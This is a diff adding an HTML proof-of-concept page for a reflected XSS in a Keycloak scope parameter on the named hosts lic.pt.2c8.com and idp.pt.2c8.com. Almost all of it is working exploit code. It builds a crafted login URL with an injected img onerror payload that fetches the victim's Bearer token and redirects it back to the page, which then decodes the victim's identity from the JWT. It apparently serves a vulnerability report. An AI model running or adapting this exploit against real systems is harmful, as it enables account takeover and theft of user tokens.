@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Token Theft PoC - lic.pt.2c8.com</title>
+    <style>
+        body { font-family: monospace; margin: 2em; background: #1a1a1a; color: #0f0; }
+        pre { background: #000; padding: 1em; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        h1 { color: #f90; }
+        a { color: #f90; font-size: 1.1em; }
+        .info { color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>XSS Account Takeover PoC</h1>
+    <p>Target: lic.pt.2c8.com via reflected XSS in Keycloak scope parameter</p>
+    <p class="info">This PoC demonstrates that an attacker can steal a logged-in user's Bearer token
+    via a single click. The stolen token and victim identity are displayed on-screen only — nothing
+    is sent to any external server.</p>
+
+    <h2>Step 1: Click this link (you must be logged into the 2c8 portal)</h2>
+    <p><a id="xss-link" href="#">Loading payload link...</a></p>
+
+    <h2>Step 2: Expected result</h2>
+    <p>The page will briefly navigate to lic.pt.2c8.com, the injected JavaScript will steal the
+    Bearer token via the token refresh endpoint, and redirect back here with the token in the URL
+    fragment. The token and decoded victim identity will be displayed below.</p>
+
+    <h2>Result:</h2>
+    <pre id="output">Waiting for exploit to run...</pre>
+
+    <script>
+    // Build the XSS payload that:
+    // 1. Fetches the token refresh endpoint (same-origin, cookie sent automatically)
+    // 2. Redirects back to this page with the token in the URL fragment
+    var thisPage = location.href.split('#')[0];
+    var payload = "fetch('/portal/api/v2/oauth/token?refresh=true')"
+        + ".then(function(r){return r.json()})"
+        + ".then(function(d){location='" + thisPage + "#token='+encodeURIComponent(d.access_token)})"
+        + ".catch(function(e){location='" + thisPage + "#error='+e.message})";
+
+    var xssUrl = "https://idp.pt.2c8.com/auth/realms/2c8/protocol/openid-connect/auth"
+        + "?response_type=code"
+        + "&client_id=2c8-portal"
+        + "&redirect_uri=" + encodeURIComponent("https://lic.pt.2c8.com/portal/api/v2/oauth/callback")
+        + "&scope=" + encodeURIComponent("openid<img src=x onerror=\"" + payload + "\">")
+        + "&state=test"
+        + "&nonce=test"
+        + "&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
+        + "&code_challenge_method=S256";
+
+    document.getElementById('xss-link').href = xssUrl;
+    document.getElementById('xss-link').textContent = "Run XSS Token Theft Exploit";
+
+    // Check if we came back with a stolen token
+    if (location.hash) {
+        var params = new URLSearchParams(location.hash.substring(1));
+        var token = params.get('token');
+        var error = params.get('error');
+        var output = document.getElementById('output');
+
+        if (token) {
+            output.textContent = '[+] TOKEN STOLEN SUCCESSFULLY VIA XSS\n\n';
+            output.textContent += '[+] Access token (first 80 chars):\n';
+            output.textContent += token.substring(0, 80) + '...\n\n';
+
+            try {
+                var payload_b64 = token.split('.')[1];
+                // Fix base64 padding
+                payload_b64 += '=='.substring(0, (4 - payload_b64.length % 4) % 4);
+                var claims = JSON.parse(atob(payload_b64));
+                output.textContent += '[+] Victim identity decoded from JWT:\n';
+                output.textContent += '    Name:     ' + claims.name + '\n';
+                output.textContent += '    Email:    ' + claims.email + '\n';
+                output.textContent += '    Sub:      ' + claims.sub + '\n';
+                output.textContent += '    Scope:    ' + claims.scope + '\n';
+                output.textContent += '    Issuer:   ' + claims.iss + '\n';
+                output.textContent += '    Expires:  ' + new Date(claims.exp * 1000).toISOString() + '\n';
+                output.textContent += '    Roles:    ' + (claims.realm_access ? JSON.stringify(claims.realm_access.roles) : '[]') + '\n';
+            } catch(e) {
+                output.textContent += '[!] Could not decode JWT: ' + e.message + '\n';
+            }
+
+            output.textContent += '\n[!] An attacker would exfiltrate this token to their server.\n';
+            output.textContent += '[!] With this token, the attacker has full API access as the victim.\n';
+            output.textContent += '[!] SameSite=Lax did NOT protect against this because the XSS\n';
+            output.textContent += '    executes on lic.pt.2c8.com itself (same-origin request).';
+        } else if (error) {
+            output.textContent = '[-] Exploit failed: ' + error + '\n';
+            output.textContent += '[-] User may not be logged in.';
+        }
+    }
+    </script>
+</body>
+</html>
